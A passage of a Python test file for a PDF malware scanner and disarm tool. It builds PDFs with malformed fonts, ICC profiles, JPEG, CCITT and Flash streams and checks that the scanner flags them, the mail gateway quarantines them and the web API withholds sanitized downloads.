        ColorSpace=pikepdf.Name.DeviceGray,
        BitsPerComponent=1,
    )


def _icc(pdf, reason):
    body = bytearray(144)
    if reason != "icc_header_invalid":
        body[:4] = len(body).to_bytes(4, "big")
        body[36:40] = b"acsp"
        body[128:132] = (2 if reason == "icc_tag_table_truncated" else 1).to_bytes(4, "big")
    profile = pdf.make_stream(bytes(body), N=3, Alternate=pikepdf.Name.DeviceRGB)
    pdf.pages[0].obj.Resources.ColorSpace = pikepdf.Dictionary(Wave4=pikepdf.Array([pikepdf.Name.ICCBased, profile]))


def test_flash_signature_is_found_through_flate_predictor():
    raw = _fixture(
        lambda pdf: _image(
            pdf,
            zlib.compress(bytes([1, ord("F"), ord("W") - ord("F"), (ord("S") - ord("W")) % 256])),
            Filter=pikepdf.Name.FlateDecode,
            DecodeParms=pikepdf.Dictionary(Predictor=15, Columns=3),
        )
    )
    with pikepdf.open(io.BytesIO(raw)) as pdf:
        assert any(
            item["codec"] == "SWF" and item["reason_codes"] == ["flash_header_invalid"]
            for item in inspect_pdf_codec_anomalies(pdf)
        )


@pytest.fixture(
    params=[
        (lambda pdf: _font(pdf, "/FontFile", b"\x80\x01\xff\xff\x00\x00"), "FONT", "type1_segment_truncated"),
        (lambda pdf: _font(pdf, "/FontFile3", b"\x02\x00\xff\x00\x00", "/Type1C"), "FONT", "cff2_header_invalid"),
        (
            lambda pdf: _image(pdf, b"invalid jpeg signature", Filter=pikepdf.Name.DCTDecode),
            "JPEG",
            "jpeg_signature_invalid",
        ),
        (lambda pdf: _ccitt(pdf, cols=0, wrapped=True), "CCITT", "ccitt_decode_parms_invalid"),
        (lambda pdf: _icc(pdf, "icc_header_invalid"), "ICC", "icc_header_invalid"),
        (lambda pdf: _image(pdf, b"FWS"), "SWF", "flash_header_invalid"),
    ],
    ids=["type1", "cff2", "jpeg", "ccitt", "icc", "swf"],
)
def corrupt_codec(request):
    edit, codec, reason = request.param
    return _fixture(edit), codec, reason


def test_corrupt_preserved_codec_is_quarantined(engines, corrupt_codec, tmp_path):
    raw, codec, reason = corrupt_codec
    for result in _scan(engines, raw, "MALICIOUS"):
        assert any(
            finding["codec"] == codec and reason in finding["reason_codes"]
            for finding in result.forensic_dossier["codec_anomalies"]
        )
    clean, audit = PDFDisarmer().sanitize_bytes(raw)
    assert not audit.is_sanitized and audit.quarantine_recommended
    assert any(
        finding["codec"] == codec and reason in finding["reason_codes"] for finding in audit.residual_codec_anomalies
    )
    _assert_integrity(raw, clean, audit)

    message = MIMEMultipart()
    attachment = MIMEApplication(raw, _subtype="pdf")
    attachment.add_header("Content-Disposition", "attachment", filename="codec.pdf")
    message.attach(attachment)
    gateway = MailGatewayFilter(scanner_engine=engines[0], quarantine_dir=tmp_path)
    output, report = gateway.process_email_bytes(message.as_bytes())
    assert report.action_taken == "QUARANTINED_ATTACHMENT" and not report.attachments[0].disarmed
    assert b"X-MalPDF-Quarantined: TRUE" in output
    assert b"Content-Type: application/pdf" not in output


@pytest.fixture(scope="module", params=["malpdf.web.app", "production.web_service"])
def codec_client(request, tmp_path_factory):
    module = importlib.import_module(request.param)
    with pytest.MonkeyPatch.context() as changes:
        changes.setattr(module.session_registry, "quarantine_root", tmp_path_factory.mktemp("wave4-quarantine"))
        with TestClient(module.app) as client:
            yield client


def test_wave4b_mail_api_preserves_quarantine_action(codec_client):
    with pikepdf.open(io.BytesIO(load_real_benign_bytes())) as pdf:
        out = io.BytesIO()
        pdf.save(out, encryption=pikepdf.Encryption(owner="owner", user="fixture", R=4))
    part = MIMEApplication(out.getvalue(), _subtype="pdf")
    part.add_header("Content-Disposition", "attachment", filename="locked.pdf")
    response = codec_client.post(
        "/api/gateway/inspect-eml", files={"file": ("locked.eml", part.as_bytes(), "message/rfc822")}
    )
    assert response.status_code == 200
    result = response.json()
    assert result["action"] == result["action_taken"] == "QUARANTINED_PASSWORD_LOCKED"
    output = codec_client.get(f"/api/gateway/download/eml/{result['eml_job_id']}")
    assert output.status_code == 200
    assert message_from_bytes(output.content)["X-MalPDF-Reason"] == "PASSWORD_LOCKED_UNINSPECTABLE"


def test_api_withholds_corrupt_cdr_download(codec_client, corrupt_codec):
    raw, _, _ = corrupt_codec
    result = codec_client.post("/api/scan", files={"file": ("codec.pdf", raw, "application/pdf")})
    assert result.status_code == 200
    scan_id = result.json()["scan_id"]
    disarm = codec_client.post(f"/api/disarm/{scan_id}")
    assert disarm.status_code == 200
    assert not disarm.json()["is_sanitized"] and disarm.json()["quarantine_recommended"]
    assert codec_client.get(f"/api/download/sanitized/{scan_id}").status_code == 409


def _jpeg(pdf):
    encoded = io.BytesIO()
    Image.new("RGB", (2, 2), "white").save(encoded, format="JPEG")
    _image(pdf, encoded.getvalue(), Filter=pikepdf.Name.DCTDecode)


@pytest.mark.parametrize("edit", [_jpeg, _ccitt, lambda pdf: _ccitt(pdf, wrapped=True)])
def test_valid_media_codec_controls(engines, edit):
    for result in _scan(engines, _fixture(edit), "BENIGN"):
        assert not result.forensic_dossier["codec_anomalies"]


@pytest.mark.parametrize(
    ("edit", "reason"),
    [
        (lambda pdf: _font(pdf, "/FontFile3", b"\x01\x00\x04\x01\x00", "/Type1C"), "cff_index_truncated"),
        (lambda pdf: _font(pdf, "/FontFile3", b"wOFF\0"), "woff_header_invalid"),
        (lambda pdf: _icc(pdf, "icc_tag_table_truncated"), "icc_tag_table_truncated"),
        (lambda pdf: _icc(pdf, "icc_tag_bounds_invalid"), "icc_tag_bounds_invalid"),
        (lambda pdf: _ccitt(pdf, rows=-1), "ccitt_decode_parms_invalid"),
        (lambda pdf: _ccitt(pdf, k=1000001), "ccitt_decode_parms_invalid"),
    ],
)
def test_extended_codec_reason_codes(edit, reason):
    with pikepdf.open(io.BytesIO(_fixture(edit))) as pdf:
        assert any(reason in finding["reason_codes"] for finding in inspect_pdf_codec_anomalies(pdf))


@pytest.mark.parametrize(
    ("fixture", "verdict"),
    [
        (load_real_benign_bytes, "BENIGN"),
        (load_real_threat_bytes, "MALICIOUS"),
    ],
)
def test_real_type1_and_icc_streams_are_not_flagged(engines, fixture, verdict):
    raw = fixture()
    with pikepdf.open(io.BytesIO(raw)) as pdf:
        type1 = {
            stream.objgen: stream
            for obj in pdf.objects
            if isinstance(obj, pikepdf.Dictionary) and isinstance(stream := obj.get("/FontFile"), pikepdf.Stream)
        }
        icc = [
            obj
            for obj in pdf.objects
            if isinstance(obj, pikepdf.Stream) and obj.get("/Alternate") == pikepdf.Name.DeviceRGB
        ]
        assert len(type1) == 11 and all(inspect_type1(stream.read_bytes())["complete"] for stream in type1.values())
        assert len(icc) == 1 and icc[0].read_bytes()[36:40] == b"acsp"
        assert inspect_pdf_codec_anomalies(pdf) == []
    for result in _scan(engines, raw, verdict):
        assert result.forensic_dossier["codec_anomalies"] == []
    if verdict == "MALICIOUS":
        clean, audit = PDFDisarmer().sanitize_bytes(raw)
        assert audit.is_sanitized
        _assert_integrity(raw, clean, audit)
        _scan(engines, clean, "BENIGN")
